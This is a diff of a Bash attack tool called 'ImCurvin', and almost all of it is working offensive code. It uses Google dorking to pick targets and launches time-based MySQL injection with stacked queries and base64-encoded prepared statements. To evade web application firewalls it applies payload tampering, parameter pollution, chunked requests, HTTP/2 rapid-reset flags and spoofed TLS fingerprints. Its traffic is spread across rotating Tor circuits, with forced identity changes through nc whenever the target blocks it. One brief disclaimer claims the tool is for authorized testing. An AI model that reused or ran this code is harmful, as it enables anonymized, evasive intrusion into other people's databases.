@@ -76,93 +76,93 @@ dork() {
 
   local gerbang
   gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-  
-  local prx="--socks5-hostname 127.0.0.1:$gerbang"
 
-  local samaran
-  samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
-  local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"
-  
-  local enc
-  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$q'''))")
-  
-  local raw
-  raw=$(curl "$prx" -s -m 10 -A "$samaran" "https://google.com{enc}&gbv=1")
+    local prx="--socks5-hostname 127.0.0.1:$gerbang"
 
-  local -a list
-  while read -r line; do
-    if [[ -n "$line" ]]; then
-      local decoded_line
-      decoded_line=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$line'''))")
-      if [[ "$decoded_line" == *"$dom"* ]]; then list+=("$decoded_line"); fi
-    fi
-  done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | sort -u | head -n 10)
+    local samaran
+    samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+      local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"
 
-  if [ ${#list[@]} -eq 0 ]; then
-    echo -e "[\033[34m${ayamaa}\033[0m] [\033[31m-\033[0m]\e[0m No links found on Google Index."
-    exit 1
-  fi
+      local enc
+      enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$q'''))")
 
-  echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Top ${#list[@]} Discovered Targets:"
-  for i in "${!list[@]}"; do echo -e "[\e[1;34m$((i+1))\e[0m] ${list[$i]}"; done
+      local raw
+      raw=$(curl "$prx" -s -m 10 -A "$samaran" "https://google.com{enc}&gbv=1")
 
-  echo -n -e "\n\e[0;32m[?]\e[0m Select target (1-${#list[@]}) or 's' to skip: "
-  read -r -n 1 sel
-  echo ""
+      local -a list
+      while read -r line; do
+        if [[ -n "$line" ]]; then
+          local decoded_line
+          decoded_line=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('''$line'''))")
+          if [[ "$decoded_line" == *"$dom"* ]]; then list+=("$decoded_line"); fi
+        fi
+      done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | sort -u | head -n 10)
 
-  sel=$(echo "$sel" | tr '[:upper:]' '[:lower:]')
-
-  if [[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -le "${#list[@]}" ] && [ "$sel" -gt 0 ]; then
-    local idx=$((sel - 1))
-    export target_url="${list[$idx]}"
-    echo -e "\e[0;32m[+]\e[0m Locked on: \e[1;34m$target_url\e[0m"
-    echo -e "[\033[34m${ayamaa}\033[0m] [i] Testing connection to selected target..."
-
-    local test_status
-    test_status=$(curl "$prx" -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")
-
-    if [ "$test_status" = "000" ]; then
-        echo -e "[\033[31m${ayamaa}\033[0m] [->] Selected URL connection timed out."
+      if [ ${#list[@]} -eq 0 ]; then
+        echo -e "[\033[34m${ayamaa}\033[0m] [\033[31m-\033[0m]\e[0m No links found on Google Index."
         exit 1
-    elif [ "$test_status" -lt 200 ] || [ "$test_status" -ge 400 ]; then
-        echo -e "[\033[31m${ayamaa}\033[0m] [->] Target returned dead status: HTTP $test_status"
-        exit 1
-    fi
+      fi
 
-    echo -e "[\033[32m${ayamaa}\033[0m] [+] Target is alive (HTTP $test_status)."
-    return 0
-  else
-    echo -e "[\033[31m${ayamaa}\033[0m] [x] Google Dorking skipped or invalid selection. Exiting tool."
-    exit 1
-  fi
-}    
+      echo -e "\n[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] Top ${#list[@]} Discovered Targets:"
+      for i in "${!list[@]}"; do echo -e "[\e[1;34m$((i+1))\e[0m] ${list[$i]}"; done
+
+      echo -n -e "\n\e[0;32m[?]\e[0m Select target (1-${#list[@]}) or 's' to skip: "
+      read -r -n 1 sel
+      echo ""
+
+      sel=$(echo "$sel" | tr '[:upper:]' '[:lower:]')
+
+      if [[ "$sel" =~ ^[0-9]+$ ]] && [ "$sel" -le "${#list[@]}" ] && [ "$sel" -gt 0 ]; then
+        local idx=$((sel - 1))
+        export target_url="${list[$idx]}"
+        echo -e "\e[0;32m[+]\e[0m Locked on: \e[1;34m$target_url\e[0m"
+        echo -e "[\033[34m${ayamaa}\033[0m] [i] Testing connection to selected target..."
+
+        local test_status
+        test_status=$(curl "$prx" -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")
+
+        if [ "$test_status" = "000" ]; then
+          echo -e "[\033[31m${ayamaa}\033[0m] [->] Selected URL connection timed out."
+          exit 1
+        elif [ "$test_status" -lt 200 ] || [ "$test_status" -ge 400 ]; then
+          echo -e "[\033[31m${ayamaa}\033[0m] [->] Target returned dead status: HTTP $test_status"
+          exit 1
+        fi
+
+        echo -e "[\033[32m${ayamaa}\033[0m] [+] Target is alive (HTTP $test_status)."
+        return 0
+      else
+        echo -e "[\033[31m${ayamaa}\033[0m] [x] Google Dorking skipped or invalid selection. Exiting tool."
+        exit 1
+      fi
+    }
     # 1st Vector func.
-   vector_sqli_agressor_left() {
+    vector_sqli_agressor_left() {
       while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         if [[ "$default_path" == "/" ]]; then
           default_path=""
         fi
-        
+
         local random_port
         random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-        
-        local current_time
-        current_time=$(date +%H:%M:%S)         
-        
-        local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"         
 
-        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
-        local random_ua="$base_ua"
-        
-        local ua_salt
-        ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+          local current_time
+          current_time=$(date +%H:%M:%S)
 
-        local target_cipher=""
-        local target_tls13=""
-        local rapid_reset_args="--http2 --parallel --parallel-max 50"
-        
-        local chunked_headers
-        chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
+          local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+
+          local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+          local random_ua="$base_ua"
+
+          local ua_salt
+          ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+
+          local target_cipher=""
+          local target_tls13=""
+          local rapid_reset_args="--http2 --parallel --parallel-max 50"
+
+          local chunked_headers
+          chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
           if [[ "$base_ua" == *"Firefox"* ]]; then
 
             random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
@@ -188,152 +188,10 @@ dork() {
           local b64_payload=$(base64_engine "$hex_xor")
           defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
 
-                    if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
+          if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
             final_query="${default_path}${defiance_tamper_path}"
           else
-            if [[ "$defiance_tamper_path" == *"="* ]]; then              
-              local param_name
-              local param_val
-              param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
-              param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
-              final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
-            else
-              final_query="${default_path}${defiance_tamper_path}"
-            fi
-          fi
-
-          local waf_trick=$(braindamage)
-          local clean_target_url="${target_url%%\?*}"
-          local active_payload=""
-          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-            active_payload="$t4"
-          else
-            active_payload="$defiance_tamper_path"
-          fi
-          local current_method="${REQ_METHOD:-POST}"
-
-          if [[ "$payloadsi" = "true" ]]; then
-            output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
-          else
-            local technique_name="Generic Time-Based"
-            case "${raw_payload}" in
-              *"benchmark"*)
-                technique_name="Time-Based (Heavy Benchmark)"
-              ;;
-              *"randomblob"*)
-                technique_name="Time-Based (CPU-Exhaustion Blob)"
-              ;;
-              *"extractvalue"*|*"updatesxml"*)
-                technique_name="Time-Based (XML Function Nested)"
-              ;;
-              *"json_keys"*)
-                technique_name="Time-Based (JSON Object Nested)"
-              ;;
-              *"sleep"*)
-                technique_name="Time-Based (Sub-Query Sleep)"
-              ;;
-            esac
-            output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
-          fi
-          echo -e "$output_text"
-                   if [ "$REQ_METHOD" = "POST" ]; then
-            curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
-              curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
-              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-              -m 12 -A "$random_ua" -s -o /dev/null -d @- \
-              -w "%{time_total}|%{http_code}" \
-              "${target_url}${default_path}")
-          else
-            curl_output=$(curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
-              --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
-              -m 12 -A "$random_ua" -s -o /dev/null \
-              -w "%{time_total}|%{http_code}" \
-              "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
-          fi 
-              
-                      local stopwatch
-            local http_status
-            stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
-            http_status=$(echo "$curl_output" | cut -d'|' -f2)
-
-            if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
-              echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
-              (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
-              sleep 1
-            fi
-            if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then    
-              if command -v bc >/dev/null 2>&1; then
-                is_gt=$(echo "$stopwatch >= 4.5" | bc -l 2>/dev/null || echo 0)
-              else      
-                if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.5)}'; then
-                  is_gt=1
-                else
-                  is_gt=0
-                fi
-              fi
-              if [[ "$is_gt" -eq 1 ]]; then
-                echo -e "[$current_time] [×] Vector confirmed MySQL Anomaly: ${stopwatch}s"
-                ( flock -x 9; echo "SQLI_ALERT|$default_path|$query_payload" >&9 ) 9>>"$ROOT_LOG_FILE"
-              fi
-            fi                            
-            sleep $((RANDOM % 6 + 4))
-          done < <(shuf "$WORDLIST_MYSQL")
-      }
-   vector_sqli_agressor_right() {
-      while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
-        if [[ "$default_path" == "/" ]]; then
-          default_path=""
-        fi
-
-        local random_port
-        random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-
-        local current_time
-        current_time=$(date +%H:%M:%S)         
-
-        local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"         
-
-        local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
-        local random_ua="$base_ua"
-
-        local ua_salt
-        ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-
-        local target_cipher=""
-        local target_tls13=""
-        local rapid_reset_args="--http2 --parallel --parallel-max 50"
-
-        local chunked_headers
-        chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
-          if [[ "$base_ua" == *"Firefox"* ]]; then
-
-            random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
-            target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
-
-          elif [[ "$base_ua" == *"iPhone"* ]]; then
-
-            random_ua="${base_ua} Mobile/15E148 Safari/604.1"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-          else
-            random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
-            target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
-            target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
-          fi
-          local defiance_tamper_path=""
-          local final_query=""
-          local raw_payload="$query_payload"
-          local t2=$(randomcase_engine "$raw_payload")
-          local t4=$(space2comment_engine "$t2")
-          local hex_xor=$(xor_engine "$t4")
-          local b64_payload=$(base64_engine "$hex_xor")
-          defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
-
-                    if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
-            final_query="${default_path}${defiance_tamper_path}"
-          else
-            if [[ "$defiance_tamper_path" == *"="* ]]; then              
+            if [[ "$defiance_tamper_path" == *"="* ]]; then
               local param_name
               local param_val
               param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
@@ -392,7 +250,149 @@ dork() {
               -w "%{time_total}|%{http_code}" \
               "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
           fi
-                      local stopwatch
+
+          local stopwatch
+          local http_status
+          stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
+          http_status=$(echo "$curl_output" | cut -d'|' -f2)
+
+          if [[ "$http_status" == "403" || "$http_status" == "429" ]]; then
+            echo -e "[\033[34m${current_time}\033[0m] [\033[1;34m!\033[0m] Port $random_port Shadowbanned [HTTP $http_status]. Rotating TOR IP Circuit..."
+            (echo "AUTHENTICATE \"\""; echo "SIGNAL NEWNYM"; echo "QUIT") | nc 127.0.0.1 9051 >/dev/null 2>&1
+            sleep 1
+          fi
+          if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then
+            if command -v bc >/dev/null 2>&1; then
+              is_gt=$(echo "$stopwatch >= 4.5" | bc -l 2>/dev/null || echo 0)
+            else
+              if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.5)}'; then
+                is_gt=1
+              else
+                is_gt=0
+              fi
+            fi
+            if [[ "$is_gt" -eq 1 ]]; then
+              echo -e "[$current_time] [×] Vector confirmed MySQL Anomaly: ${stopwatch}s"
+              ( flock -x 9; echo "SQLI_ALERT|$default_path|$query_payload" >&9 ) 9>>"$ROOT_LOG_FILE"
+            fi
+          fi
+          sleep $((RANDOM % 6 + 4))
+        done < <(shuf "$WORDLIST_MYSQL")
+      }
+      vector_sqli_agressor_right() {
+        while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
+          if [[ "$default_path" == "/" ]]; then
+            default_path=""
+          fi
+
+          local random_port
+          random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
+
+            local current_time
+            current_time=$(date +%H:%M:%S)
+
+            local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"
+
+            local base_ua="${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}"
+            local random_ua="$base_ua"
+
+            local ua_salt
+            ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+
+            local target_cipher=""
+            local target_tls13=""
+            local rapid_reset_args="--http2 --parallel --parallel-max 50"
+
+            local chunked_headers
+            chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
+            if [[ "$base_ua" == *"Firefox"* ]]; then
+
+              random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
+              target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+              target_tls13="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
+
+            elif [[ "$base_ua" == *"iPhone"* ]]; then
+
+              random_ua="${base_ua} Mobile/15E148 Safari/604.1"
+              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384"
+              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+            else
+              random_ua="${base_ua} Chrome/$((RANDOM % 10 + 125)).0.$((RANDOM % 999 + 1000)).$((RANDOM % 99)) Safari/537.36"
+              target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
+              target_tls13="TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
+            fi
+            local defiance_tamper_path=""
+            local final_query=""
+            local raw_payload="$query_payload"
+            local t2=$(randomcase_engine "$raw_payload")
+            local t4=$(space2comment_engine "$t2")
+            local hex_xor=$(xor_engine "$t4")
+            local b64_payload=$(base64_engine "$hex_xor")
+            defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
+
+            if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
+              final_query="${default_path}${defiance_tamper_path}"
+            else
+              if [[ "$defiance_tamper_path" == *"="* ]]; then
+                local param_name
+                local param_val
+                param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
+                param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
+                final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
+              else
+                final_query="${default_path}${defiance_tamper_path}"
+              fi
+            fi
+
+            local waf_trick=$(braindamage)
+            local clean_target_url="${target_url%%\?*}"
+            local active_payload=""
+            if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+              active_payload="$t4"
+            else
+              active_payload="$defiance_tamper_path"
+            fi
+            local current_method="${REQ_METHOD:-POST}"
+
+            if [[ "$payloadsi" = "true" ]]; then
+              output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
+            else
+              local technique_name="Generic Time-Based"
+              case "${raw_payload}" in
+                *"benchmark"*)
+                  technique_name="Time-Based (Heavy Benchmark)"
+                ;;
+                *"randomblob"*)
+                  technique_name="Time-Based (CPU-Exhaustion Blob)"
+                ;;
+                *"extractvalue"*|*"updatesxml"*)
+                  technique_name="Time-Based (XML Function Nested)"
+                ;;
+                *"json_keys"*)
+                  technique_name="Time-Based (JSON Object Nested)"
+                ;;
+                *"sleep"*)
+                  technique_name="Time-Based (Sub-Query Sleep)"
+                ;;
+              esac
+              output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
+            fi
+            echo -e "$output_text"
+            if [ "$REQ_METHOD" = "POST" ]; then
+              curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
+                curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
+                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+                -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+                -w "%{time_total}|%{http_code}" \
+                "${target_url}${default_path}")
+            else
+              curl_output=$(curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
+                --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+                -m 12 -A "$random_ua" -s -o /dev/null \
+                -w "%{time_total}|%{http_code}" \
+                "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
+            fi
+            local stopwatch
             local http_status
             stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
             http_status=$(echo "$curl_output" | cut -d'|' -f2)
@@ -403,10 +403,10 @@ dork() {
               sleep 1
             fi
 
-                        if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then    
+            if [[ -n "$stopwatch" && "$stopwatch" != "0" && "$stopwatch" != "0.0" && "$stopwatch" != "0.000000" ]]; then
               if command -v bc >/dev/null 2>&1; then
                 is_gt=$(echo "$stopwatch >= 4.5" | bc -l 2>/dev/null || echo 0)
-              else      
+              else
                 if awk -v sw="$stopwatch" 'BEGIN {exit !(sw >= 4.5)}'; then
                   is_gt=1
                 else
@@ -422,22 +422,22 @@ dork() {
 
             sleep $((RANDOM % 6 + 4))
           done < <(shuf "$WORDLIST_MYSQL")
-      }
-                     
+        }
+
         reconi() {
           local current_time=$(date +%H:%M:%S)
           echo -e "\n[\033[34mWARNING\033[0m] ImCurvin is designed for \033[1mauthorized security testing and educational purposes only.\033[0m"
 
           echo -e "Running this tool against targets without priorwritten consent is strictly illegal. \033[1mThe developer assumes no liability and not responsible for any misuse, damage, or system instability caused by this software.\033[0m By executing this script, you agree to these terms.\n"
           echo -e "[\033[34m${current_time}\033[0m] [i] Initiating Rapid Environmental Reconnaissance on $target_url..."
-if ! command -v whois &> /dev/null; then
-          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'whois' is not installed on your terminal."
-          echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install whois first before running imCurvin'."
-          exit 1
-        fi
+          if ! command -v whois &> /dev/null; then
+            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'whois' is not installed on your terminal."
+            echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install whois first before running imCurvin'."
+            exit 1
+          fi
           echo -e "[\033[34m${current_time}\033[0m] [i] Network locked to static proxy configuration [Port: 9050] for instant evaluation.\n"
 
-          local static_proxy="--socks5-hostname 127.0.0.1:9050"         
+          local static_proxy="--socks5-hostname 127.0.0.1:9050"
 
           local clean_domain=$(echo "$target_url" | awk -F/ '{print $3}' | cut -d':' -f1)
 
@@ -572,244 +572,244 @@ if ! command -v whois &> /dev/null; then
           echo -e "\n[\033[34m$(date +%H:%M:%S)\033[0m] [i] Execution completed successfully."
           exit 0
         }
-  helping() {
-  echo -e "->>\n"
-  echo -e "Usage: imcurvin -u <TARGET_URL> [OPTION]\n"
-  echo -e "Available Options:"
-  echo -e "  -u <URL>         : Specify the target website URL (Required)"
-   echo -e "  -tech            : Display advanced technical methodologies and framework configurations (READ THIS IF YOU HAVE NOT YET, TO PREVENT UNINTENDED ACTIONS)"
-  echo -e "  -cnf             : Automode (Passed directly to Defiance)"
-  echo -e "  -rec             : Run environment reconnaissance"
-  echo -e "  -shwpld          : Show payloads actively during execution"
-  echo -e "  -val             : Enable post-scan Python validation engine for latency isolation"
-  echo -e "  -cookie=<string> : Ingest custom session cookies (e.g., -cookie=\"PHPSESSID=123\")"
-  echo -e "  -h               : Display this help guide"
-  echo -e "\n->>"
-  exit 0
-}
-show_tech() {
-echo -e "===========================================\n"
-    echo -e "\n\e[34mReconnaissance\e[0m"
-    echo -e "* \e[1mHybrid URL Parsing\e[0m: Dynamically traces \e[1mPreFlight HTTP Redirections\e[0m to secure the absolute destination URL before passing it to localized multi-vector attack sequences."
-    echo -e ""
-    echo -e "* \e[1mGoogle Dorking Reconnaissance\e[0m: Automatically discovers additional vulnerable endpoints within the target domain to expand the attack surface."
-    echo -e ""
+        helping() {
+          echo -e "->>\n"
+          echo -e "Usage: imcurvin -u <TARGET_URL> [OPTION]\n"
+          echo -e "Available Options:"
+          echo -e "  -u <URL>         : Specify the target website URL (Required)"
+          echo -e "  -tech            : Display advanced technical methodologies and framework configurations (READ THIS IF YOU HAVE NOT YET, TO PREVENT UNINTENDED ACTIONS)"
+          echo -e "  -cnf             : Automode (Passed directly to Defiance)"
+          echo -e "  -rec             : Run environment reconnaissance"
+          echo -e "  -shwpld          : Show payloads actively during execution"
+          echo -e "  -val             : Enable post-scan Python validation engine for latency isolation"
+          echo -e "  -cookie=<string> : Ingest custom session cookies (e.g., -cookie=\"PHPSESSID=123\")"
+          echo -e "  -h               : Display this help guide"
+          echo -e "\n->>"
+          exit 0
+        }
+        show_tech() {
+          echo -e "===========================================\n"
+          echo -e "\n\e[34mReconnaissance\e[0m"
+          echo -e "* \e[1mHybrid URL Parsing\e[0m: Dynamically traces \e[1mPreFlight HTTP Redirections\e[0m to secure the absolute destination URL before passing it to localized multi-vector attack sequences."
+          echo -e ""
+          echo -e "* \e[1mGoogle Dorking Reconnaissance\e[0m: Automatically discovers additional vulnerable endpoints within the target domain to expand the attack surface."
+          echo -e ""
 
-    echo -e "\e[34mNetwork Evasion & Multi-Port TOR Routing\e[0m"
-    echo -e "* \e[1mMulti-Port TOR Exporting\e[0m: Completely eliminates the typical single circuit TOR bottleneck by exporting \e[1mmultiple active TOR ports\e[0m simultaneously (such as \e[1m9050, 9052, and more\e[0m)."
-    echo -e ""
-    echo -e "* \e[1mLoad-Balanced Requests\e[0m: The Bash architecture randomly distributes parallel \e[1mMySQL attack threads\e[0m across \e[1m6 distinct TOR circuits\e[0m to balance outbound network traffic."
-    echo -e ""
-    echo -e "* \e[1mContinuous Identity Mutation\e[0m: Pushes evasion to its \"limits\" through \e[1mdynamic multi-IP TOR circuit rotations\e[0m per request combined with \e[1mautomated UserAgent mutations\e[0m on every concurrent thread."
-    echo -e ""
-    echo -e "* \e[1mRandomized Delay Insertion (Jitter)\e[0m: Introduces unpredictable, \e[1mnon-linear time intervals\e[0m between concurrent requests to destroy the traffic-pattern baselines of behavioral AI filters."
-    echo -e ""
+          echo -e "\e[34mNetwork Evasion & Multi-Port TOR Routing\e[0m"
+          echo -e "* \e[1mMulti-Port TOR Exporting\e[0m: Completely eliminates the typical single circuit TOR bottleneck by exporting \e[1mmultiple active TOR ports\e[0m simultaneously (such as \e[1m9050, 9052, and more\e[0m)."
+          echo -e ""
+          echo -e "* \e[1mLoad-Balanced Requests\e[0m: The Bash architecture randomly distributes parallel \e[1mMySQL attack threads\e[0m across \e[1m6 distinct TOR circuits\e[0m to balance outbound network traffic."
+          echo -e ""
+          echo -e "* \e[1mContinuous Identity Mutation\e[0m: Pushes evasion to its \"limits\" through \e[1mdynamic multi-IP TOR circuit rotations\e[0m per request combined with \e[1mautomated UserAgent mutations\e[0m on every concurrent thread."
+          echo -e ""
+          echo -e "* \e[1mRandomized Delay Insertion (Jitter)\e[0m: Introduces unpredictable, \e[1mnon-linear time intervals\e[0m between concurrent requests to destroy the traffic-pattern baselines of behavioral AI filters."
+          echo -e ""
 
-    echo -e "\e[34mAdvanced WAF Bypass & Obfuscation\e[0m"
-    echo -e "The engine deploys a \e[1msynchronized dual-vector parallel attack\e[0m that simultaneously probes MySQL time-based anomalies using multi-layered payload obfuscation and intelligent header injection, featuring:"
-    echo -e ""
-    echo -e "* \e[1mStacked Queries Injection\e[0m: Utilizes the stacked query technique (\e[1m;\e[0m) to terminate the application's original database query and force the independent execution of injected dynamic SQL statements."
-    echo -e ""
-    echo -e "* \e[1mHTTP Parameter Pollution (HPP) Splitting\e[0m: Injects duplicated query parameters with identical names (\e[1mparam_name=999&param_name=payload\e[0m) to exploit parsing discrepancies between the front-end WAF and the back-end application server, effectively masking malicious database payloads behind benign values."
-    echo -e ""
